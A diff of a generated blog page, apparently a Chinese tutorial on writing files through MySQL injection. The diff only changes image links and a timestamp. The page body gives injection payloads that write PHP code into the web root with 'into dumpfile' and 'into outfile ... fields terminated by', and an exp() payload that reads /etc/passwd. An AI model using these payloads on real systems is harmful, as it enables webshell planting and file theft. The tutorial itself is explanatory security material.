@@ -89,10 +89,10 @@
 <meta property="og:description" content="1.用UNION写入&amp;nbsp;&amp;nbsp;http://url/?id=1 and 0 union select 1,2 ,’&amp;lt;?php phpinfo(); ?&amp;gt;’ into dumpfile ‘文件绝对路径’&amp;nbsp;&amp;nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，但是如果用来写bat,m">
 <meta property="og:image" content="http://i1.bvimg.com/616806/aef6254a1b3eb443.png">
 <meta property="og:image" content="http://i1.bvimg.com/616806/2a8ed815fdf95385.png">
-<meta property="og:image" content="https://tu.aixinxi.net/views/pic.php?key=2e520044c7673af2224b68a50895c3fe">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-w.jpg">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1c7bt8hbmc5ev2a1tvt1gvh12jga.png-j.jpg">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-j.jpg">
 <meta property="og:image" content="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg">
-<meta property="og:updated_time" content="2018-02-27T15:18:01.871Z">
+<meta property="og:updated_time" content="2018-02-27T15:22:18.346Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql写入文件小技巧">
 <meta name="twitter:description" content="1.用UNION写入&amp;nbsp;&amp;nbsp;http://url/?id=1 and 0 union select 1,2 ,’&amp;lt;?php phpinfo(); ?&amp;gt;’ into dumpfile ‘文件绝对路径’&amp;nbsp;&amp;nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，但是如果用来写bat,m">
@@ -317,7 +317,7 @@
 
       
         <h1 id="1-用UNION写入"><a href="#1-用UNION写入" class="headerlink" title="1.用UNION写入"></a>1.用UNION写入</h1><p>&nbsp;&nbsp;<a href="http://url/?id=1" target="_blank" rel="external">http://url/?id=1</a> and 0 union select 1,2 ,’&lt;?php phpinfo(); ?&gt;’ into dumpfile ‘文件绝对路径’<br><img src="http://i1.bvimg.com/616806/aef6254a1b3eb443.png" alt=""><br>&nbsp;&nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，<br>但是如果用来写bat,mof,vbs等文件就会出问题了，那么怎么去掉这个只写入我们需要的内容呢？采用hex编码就好了。<br><img src="http://i1.bvimg.com/616806/2a8ed815fdf95385.png" alt=""><br>&nbsp;&nbsp;将我们要写入的内容使用hex编码在分段写在每个字段位上，这样就可以只写入我们需要的内容了。</p>
-<h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="https://tu.aixinxi.net/views/pic.php?key=2e520044c7673af2224b68a50895c3fe" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-w.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/" target="_blank" rel="external">http://127.0.0.1:8080/</a>“; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>
+<h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="http://t1.aixinxi.net/o_1c7bt8hbmc5ev2a1tvt1gvh12jga.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/" target="_blank" rel="external">http://127.0.0.1:8080/</a>“; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>
 
       
     </div>
